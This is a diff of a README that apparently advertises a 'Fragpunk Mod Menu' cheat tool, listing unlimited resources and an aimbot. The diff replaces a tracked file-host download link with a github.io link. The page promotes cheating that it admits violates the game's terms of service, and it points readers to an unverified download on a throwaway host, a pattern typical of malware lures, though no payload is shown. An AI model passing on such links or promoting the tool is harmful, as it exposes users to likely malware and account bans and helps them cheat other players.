@@ -1,6 +1,6 @@
 Fragpunk Mod Menu is a customizable tool designed to enhance the player’s experience in Fragpunk by offering a variety of cheats and mods through an easy-to-use interface. This menu allows players to activate and modify various game features to gain unfair advantages, such as unlimited resources, aimbots, and other enhancements, without the need to grind or spend real money. While it provides a more exciting or easier gaming experience, using it violates the game’s terms of service and can result in account penalties.
 
-[![Download Fragpunk Mod Menu](https://img.shields.io/badge/Download-Fragpunk%20ModMenu-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Fragpunk Mod Menu](https://img.shields.io/badge/Download-Fragpunk%20ModMenu-blueviolet)](https://fragpunk-mod-menu.github.io/.github/)
 
 - **Unlimited Resources**: Unlock an infinite amount of in-game currency, items, and boosts, allowing for faster progression without having to grind for rewards.
 - **Aimbot**: Automatically locks onto enemies, providing precise aiming and improving accuracy, often guaranteeing headshots for easy eliminations.
